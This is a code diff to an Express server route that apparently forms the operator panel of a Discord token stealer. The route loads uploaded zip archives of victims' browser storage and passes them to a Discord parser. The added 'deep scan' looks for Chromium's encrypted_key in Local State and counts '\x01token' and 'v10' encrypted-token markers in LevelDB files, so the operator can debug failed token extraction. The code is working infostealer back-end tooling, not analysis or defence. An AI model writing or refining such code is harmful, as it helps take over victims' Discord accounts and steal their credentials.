@@ -582,11 +582,44 @@ app.get("/dc/:id", checkKey, async (req, res) => {
     const results = parseDiscordZip(rows[0].filedata);
     const k = encodeURIComponent(req.query.key);
 
-    // zip contents debug
+    // zip contents + deep debug
     let zipEntries = [];
+    let deepDbg = {};
     try {
       const dbgZip = new AdmZip(rows[0].filedata);
-      zipEntries = dbgZip.getEntries().map(e => `${e.entryName} (${e.header.size}b)`);
+      const dbgEntries = dbgZip.getEntries();
+      zipEntries = dbgEntries.map(e => `${e.entryName} (${e.header.size}b)`);
+
+      // check Local State for encrypted_key
+      const lsE = dbgEntries.find(e => e.entryName.endsWith('/ls'));
+      if (lsE) {
+        const lsTxt = lsE.getData().toString('utf8');
+        deepDbg.hasEncKey = lsTxt.includes('"encrypted_key"');
+        deepDbg.lsLen = lsTxt.length;
+        // try to extract key preview
+        const km = lsTxt.indexOf('"encrypted_key":"');
+        if (km >= 0) {
+          const ks = km + 17, ke = lsTxt.indexOf('"', ks);
+          deepDbg.encKeyB64Len = ke > ks ? ke - ks : 0;
+        }
+      }
+
+      // count \x01token marker in each LDB
+      const mk = Buffer.from([0x01,0x74,0x6f,0x6b,0x65,0x6e]);
+      const mkV10 = Buffer.from('v10');
+      deepDbg.tokenMarkers = {};
+      for (const e of dbgEntries) {
+        if (!/\.(ldb|log|sst)$/.test(e.entryName)) continue;
+        const d = e.getData();
+        let cnt = 0, v10cnt = 0, pos = 0;
+        while (true) {
+          const idx = d.indexOf(mk, pos); if (idx === -1) break;
+          cnt++; pos = idx + 1;
+          const after = d.slice(idx + mk.length, idx + mk.length + 30);
+          if (after.indexOf(mkV10) >= 0) v10cnt++;
+        }
+        if (cnt > 0) deepDbg.tokenMarkers[e.entryName.split('/').pop()] = `x${cnt} (v10: ${v10cnt})`;
+      }
     } catch(e) { zipEntries = ['zip parse error: ' + e.message]; }
 
     const cards = results.length ? results.map(r => {
@@ -612,6 +645,10 @@ app.get("/dc/:id", checkKey, async (req, res) => {
       <div class="tcard" style="margin-top:20px">
         <div class="tc-tag">ZIP CONTENTS (DEBUG)</div>
         ${zipEntries.map(e => `<div class="tc-val mono" style="font-size:10px;margin-bottom:2px">${esc(e)}</div>`).join('')}
+        <div class="tc-label" style="margin-top:14px">DEEP SCAN</div>
+        <div class="tc-val mono" style="font-size:10px">LocalState hasEncKey: ${deepDbg.hasEncKey} | len: ${deepDbg.lsLen} | b64len: ${deepDbg.encKeyB64Len}</div>
+        <div class="tc-label" style="margin-top:8px">\\x01token HITS (+ v10 check)</div>
+        ${Object.entries(deepDbg.tokenMarkers||{}).map(([f,c])=>`<div class="tc-val mono" style="font-size:10px">${esc(f)}: ${esc(c)}</div>`).join('') || '<div class="tc-val red" style="font-size:10px">NO \\x01token FOUND IN ANY LDB</div>'}
       </div>`;
 
     res.send(`<!DOCTYPE html>
